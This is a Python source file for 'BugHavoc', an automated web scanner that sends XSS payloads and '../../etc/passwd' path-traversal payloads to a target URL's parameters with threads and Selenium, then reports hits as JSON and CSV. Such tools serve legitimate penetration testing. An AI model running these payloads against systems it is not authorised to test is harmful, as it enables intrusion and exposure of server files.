import requests
import concurrent.futures
import json
import csv
import time
import argparse
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.alert import Alert
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# Banner Display
def print_banner():
    banner = r"""BugHavoc
    XSS & LFI Brute Forcer

    Automated XSS & LFI Scanner
    Multithreading for Speed
    Report Generation (JSON & CSV)
    Automatic Parameter Detection
    """
    print(banner)
    time.sleep(1)

# Argument Parser
def get_args():
    parser = argparse.ArgumentParser(
        prog="BugHavoc",
        description="BugHavoc - XSS & LFI Brute Forcer\nAutomated vulnerability scanner for XSS and LFI",
        epilog="Example usage:\n python havoc.py -u http://example.com/page.php -x xss_payloads.txt -l lfi_payloads.txt",
        formatter_class=argparse.RawTextHelpFormatter
    )

    parser.add_argument(
        "-u", "--url",
        required=True,
        help="Target URL (e.g. http://example.com/page.php)"
    )

    parser.add_argument(
        "-x", "--xss-wordlist",
        help="Path to XSS payload wordlist"
    )

    parser.add_argument(
        "-l", "--lfi-wordlist",
        help="Path to LFI payload wordlist"
    )

    parser.add_argument(
        "--only-xss",
        action="store_true",
        help="Only test for XSS vulnerabilities"
    )

    parser.add_argument(
        "--only-lfi",
        action="store_true",
        help="Only test for LFI vulnerabilities"
    )

    parser.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="Enable verbose output"
    )

    return parser.parse_args()

# Store detected vulnerabilities
vulnerabilities = []

def extract_parameters(url):
    """Automatically extracts form parameters from a webpage."""
    response = requests.get(url)
    soup = BeautifulSoup(response.text, "html.parser")
    inputs = soup.find_all("input")
    params = [inp.get("name") for inp in inputs if inp.get("name")]
    if not params:
        print("[-] No parameters found, using 'id' as default.")
        return ["id"]
    return params

def test_xss(url, params, xss_payloads):
    """Tests for XSS vulnerabilities using multithreading."""
    print("\n[+] Testing for XSS...")

    def check_xss(payload):
        injected_params = {param: payload for param in params}
        response = requests.get(url, params=injected_params)
        if payload in response.text:
            result = f"[!] Possible XSS found with payload: {payload}"
            vulnerabilities.append({"type": "XSS", "url": url, "payload": payload})
            return result
        return f"[-] No XSS detected with payload: {payload}"

    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        results = executor.map(check_xss, xss_payloads)
        for result in results:
            print(result)

def test_dom_xss(url, param, xss_payloads):
    """Tests for DOM-Based XSS using Selenium."""
    print("\n[+] Testing for DOM XSS...")
    driver = webdriver.Firefox()  # Change to webdriver.Chrome() if using Chrome

    for payload in xss_payloads:
        full_url = f"{url}?{param}={payload}"
        driver.get(full_url)

        try:
            WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.TAG_NAME, "body")))

            try:
                alert = WebDriverWait(driver, 3).until(EC.alert_is_present())
                alert.dismiss()
                print("[!] Unexpected alert detected and dismissed.")
            except:
                pass

            page_source = driver.page_source
            if page_source and payload in page_source:
                print(f"[!] DOM XSS vulnerability detected with payload: {payload}")
                vulnerabilities.append({"type": "DOM XSS", "url": full_url, "payload": payload})

        except Exception as e:
            print(f"[-] Error loading page or processing the source: {str(e)}")

    driver.quit()

def detect_lfi(response_text):
    """Checks for LFI vulnerabilities based on file signatures."""
    signatures = ["root:x", "bin/bash", "<?php", "ELF"]
    return any(sig in response_text for sig in signatures)

def test_lfi(url, param, lfi_payloads):
    """Tests for LFI vulnerabilities using multithreading."""
    print("\n[+] Testing for LFI...")

    def check_lfi(payload):
        response = requests.get(url, params={param: payload})
        if detect_lfi(response.text):
            result = f"[!] Possible LFI found with payload: {payload}"
            vulnerabilities.append({"type": "LFI", "url": url, "payload": payload})
            return result
        return f"[-] No LFI detected with payload: {payload}"

    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        results = executor.map(check_lfi, lfi_payloads)
        for result in results:
            print(result)

def save_results():
    """Saves results to JSON and CSV files."""
    if not vulnerabilities:
        print("\n[-] No vulnerabilities found. No report generated.")
        return

    with open("vulnerabilities.json", "w") as json_file:
        json.dump(vulnerabilities, json_file, indent=4)
        print("\n[+] Report saved as vulnerabilities.json")

    with open("vulnerabilities.csv", "w", newline="") as csv_file:
        fieldnames = ["type", "url", "payload"]
        writer = csv.DictWriter(csv_file, fieldnames=fieldnames)
        writer.writeheader()
        writer.writerows(vulnerabilities)
        print("[+] Report saved as vulnerabilities.csv")

def load_wordlist(filepath, default_list):
    """Loads payloads from a wordlist file, or returns default list if file not provided."""
    if filepath:
        try:
            with open(filepath, 'r') as file:
                return [line.strip() for line in file.readlines() if line.strip()]
        except Exception as e:
            print(f"[-] Error loading wordlist from {filepath}: {e}")
    return default_list

if __name__ == "__main__":
    args = get_args()
    print_banner()

    DEFAULT_XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "\"'><script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
    ]

    DEFAULT_LFI_PAYLOADS = [
        "../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../../etc/passwd",
    ]

    xss_payloads = load_wordlist(args.xss_wordlist, DEFAULT_XSS_PAYLOADS)
    lfi_payloads = load_wordlist(args.lfi_wordlist, DEFAULT_LFI_PAYLOADS)

    target_url = args.url
    parameters = extract_parameters(target_url)
    print(f"[+] Found parameters: {parameters}")

    if args.only_xss:
        test_xss(target_url, parameters, xss_payloads)
        test_dom_xss(target_url, parameters[0], xss_payloads)
    elif args.only_lfi:
        test_lfi(target_url, parameters[0], lfi_payloads)
    else:
        test_xss(target_url, parameters, xss_payloads)
        test_dom_xss(target_url, parameters[0], xss_payloads)
        test_lfi(target_url, parameters[0], lfi_payloads)

    save_results()
